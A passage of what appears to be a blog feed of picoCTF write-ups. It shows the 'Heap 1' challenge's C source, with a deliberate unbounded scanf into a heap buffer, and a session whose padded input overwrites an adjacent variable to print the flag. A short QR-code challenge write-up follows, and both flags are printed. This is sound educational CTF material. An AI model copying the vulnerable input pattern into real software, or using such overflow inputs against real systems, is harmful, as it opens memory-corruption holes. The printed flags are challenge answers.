</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 54</span><span>    input_data <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">malloc</span>(INPUT_DATA_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 55</span><span>    <span style="color:#89b4fa">strncpy</span>(input_data, <span style="color:#a6e3a1">&#34;pico&#34;</span>, INPUT_DATA_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 56</span><span>    safe_var <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">malloc</span>(SAFE_VAR_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 57</span><span>    <span style="color:#89b4fa">strncpy</span>(safe_var, <span style="color:#a6e3a1">&#34;bico&#34;</span>, SAFE_VAR_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 58</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 59</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 60</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">write_buffer</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 61</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Data for buffer: &#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 62</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 63</span><span>    <span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%s&#34;</span>, input_data);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 64</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 65</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 66</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">print_heap</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 67</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Heap State:</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 68</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 69</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;[*] Address   -&gt;   Heap Data   </span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 70</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 71</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;[*]   %p  -&gt;   %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, input_data, input_data);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 72</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 73</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;[*]   %p  -&gt;   %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, safe_var, safe_var);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 74</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 75</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 76</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 77</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 78</span><span><span style="color:#f38ba8">int</span> <span style="color:#89b4fa">main</span>(<span style="color:#f38ba8">void</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 79</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 80</span><span>    <span style="color:#6c7086;font-style:italic">// Setup
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 81</span><span><span style="color:#6c7086;font-style:italic"></span>    <span style="color:#89b4fa">init</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 82</span><span>    <span style="color:#89b4fa">print_heap</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 83</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 84</span><span>    <span style="color:#f38ba8">int</span> choice;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 85</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 86</span><span>    <span style="color:#cba6f7">while</span> (<span style="color:#fab387">1</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 87</span><span>        <span style="color:#89b4fa">print_menu</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 88</span><span>	<span style="color:#cba6f7">if</span> (<span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%d&#34;</span>, <span style="color:#89dceb;font-weight:bold">&amp;</span>choice) <span style="color:#89dceb;font-weight:bold">!=</span> <span style="color:#fab387">1</span>) <span style="color:#89b4fa">exit</span>(<span style="color:#fab387">0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 89</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 90</span><span>        <span style="color:#cba6f7">switch</span> (choice) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 91</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">1</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 92</span><span>            <span style="color:#6c7086;font-style:italic">// print heap
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 93</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#89b4fa">print_heap</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 94</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 95</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">2</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 96</span><span>            <span style="color:#89b4fa">write_buffer</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 97</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 98</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">3</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 99</span><span>            <span style="color:#6c7086;font-style:italic">// print safe_var
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">100</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">Take a look at my variable: safe_var = %s</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">101</span><span>                   safe_var);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">102</span><span>            <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">103</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">104</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">4</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">105</span><span>            <span style="color:#6c7086;font-style:italic">// Check for win condition
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">106</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#89b4fa">check_win</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">107</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">108</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">5</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">109</span><span>            <span style="color:#6c7086;font-style:italic">// exit
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">110</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#cba6f7">return</span> <span style="color:#fab387">0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">111</span><span>        <span style="color:#cba6f7">default</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">112</span><span>            <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Invalid choice</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">113</span><span>            <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">114</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">115</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">116</span><span>}</span></span></code></pre></div>
<br>
<p>Check out <code>check_win</code> function for the win condition:</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">check_win</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>    <span style="color:#cba6f7">if</span> (<span style="color:#89dceb;font-weight:bold">!</span><span style="color:#89b4fa">strcmp</span>(safe_var, <span style="color:#a6e3a1">&#34;pico&#34;</span>)) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">YOU WIN</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);</span></span></code></pre></div>
<p>Heap 1 task is every similar to Heap 0. The only difference is that we need to make the value of <code>safe_var</code> variable to &ldquo;<strong>pico</strong>&rdquo;. The address values of the variables are the same with Heap 0. Therefore, we already know they are 32bits apart. All we need to do is input 32-bit long characters to fill <code>input_data</code> variable and type &ldquo;<strong>pico</strong>&rdquo; after to overwrite the value of <code>safe_var</code> variable.</p>
<br>
<br>
<br>
Here's the solution:






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>Welcome to heap1!
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>I put my data on the heap so it should be safe from any tampering.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Since my data isn<span style="color:#a6e3a1">&#39;t on the stack I&#39;</span>ll even <span style="color:#89dceb">let</span> you write whatever info you want to the heap, I already took care of using malloc <span style="color:#cba6f7">for</span> you.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Heap State:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>+-------------+----------------+
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Address   -&gt;   Heap Data
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>+-------------+----------------+
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span>   0x63e0c8e3d2b0  -&gt;   pico
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>+-------------+----------------+
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span>   0x63e0c8e3d2d0  -&gt;   bico
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>+-------------+----------------+
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>1. Print Heap:          <span style="color:#89dceb;font-weight:bold">(</span>print the current state of the heap<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>2. Write to buffer:     <span style="color:#89dceb;font-weight:bold">(</span>write to your own personal block of data on the heap<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>3. Print safe_var:      <span style="color:#89dceb;font-weight:bold">(</span>I<span style="color:#a6e3a1">&#39;ll even let you look at my variable on the heap, I&#39;</span>m confident it can<span style="color:#a6e3a1">&#39;t be modified)
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span><span style="color:#a6e3a1">4. Print Flag:          (Try to print the flag, good luck)
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span><span style="color:#a6e3a1">5. Exit
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span><span style="color:#a6e3a1">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span><span style="color:#a6e3a1">Enter your choice: 2
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span><span style="color:#a6e3a1">Data for buffer: abcdefghijklmnopqrstuvwxyz123456pico
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span><span style="color:#a6e3a1">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span><span style="color:#a6e3a1">1. Print Heap:          (print the current state of the heap)
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span><span style="color:#a6e3a1">2. Write to buffer:     (write to your own personal block of data on the heap)
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span><span style="color:#a6e3a1">3. Print safe_var:      (I&#39;</span>ll even <span style="color:#89dceb">let</span> you look at my variable on the heap, I<span style="color:#a6e3a1">&#39;m confident it can&#39;</span>t be modified<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>4. Print Flag:          <span style="color:#89dceb;font-weight:bold">(</span>Try to print the flag, good luck<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>5. Exit
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>Enter your choice: <span style="color:#fab387">3</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>Take a look at my variable: <span style="color:#f5e0dc">safe_var</span> <span style="color:#89dceb;font-weight:bold">=</span> pico
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>1. Print Heap:          <span style="color:#89dceb;font-weight:bold">(</span>print the current state of the heap<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>2. Write to buffer:     <span style="color:#89dceb;font-weight:bold">(</span>write to your own personal block of data on the heap<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>3. Print safe_var:      <span style="color:#89dceb;font-weight:bold">(</span>I<span style="color:#a6e3a1">&#39;ll even let you look at my variable on the heap, I&#39;</span>m confident it can<span style="color:#f38ba8">&#39;</span>t be modified<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>4. Print Flag:          <span style="color:#89dceb;font-weight:bold">(</span>Try to print the flag, good luck<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">39</span><span>5. Exit
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">40</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">41</span><span>Enter your choice: <span style="color:#fab387">4</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">42</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">43</span><span>YOU WIN
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">44</span><span>picoCTF<span style="color:#89dceb;font-weight:bold">{</span>starting_to_get_the_hang_ce5bee9b<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<p><strong><em>flag</em></strong>: picoCTF{starting_to_get_the_hang_ce5bee9b}</p>
<hr>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] Scan Surprise</title>
      <link>http://localhost:1313/picoctf-scan-surprise/</link>
      <pubDate>Thu, 04 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-scan-surprise/</guid>
      <description>Description I&amp;rsquo;ve gotton bored of handing out flags as text. Wouldn&amp;rsquo;t it be cool if they were an image instead?
This is what wee see when we first log into the ssh server, a QR code. The one thing we could easily do to capture the flag is to scan the QR code with our mobile phones since they have included native QR code scanner in their cameras since version 8 and iOS 11.</description>
      <content:encoded><![CDATA[<h3 id="description">Description</h3>
<br>
<p>I&rsquo;ve gotton bored of handing out flags as text.
Wouldn&rsquo;t it be cool if they were an image instead?</p>
<hr>
<p>This is what wee see when we first log into the ssh server, a QR code.
<img src="image.png#center" alt="alt text"></p>
<p>The one thing we could easily do to capture the flag is to scan the QR code with our mobile phones since they have included native QR code scanner in their cameras since <em>version 8</em> and <em>iOS 11</em>.</p>
<div style="text-align: center"><img src="./IMG_8604.PNG" style="width: 300px; "></div>
<p>This is a screenshot of my camera app scanning the QR code, as you can see the camera app automatically recognizes the QR code and it&rsquo;s directing us to a destination.</p>
<div style="text-align: center"><img src="./IMG_8605.PNG" style="width: 300px; "></div>
<p>Looks like we got the flag.</p>
<p><strong><em>flag</em></strong>: <code>picoCTF{p33k_@_b00_0194a007}</code></p>
<hr>
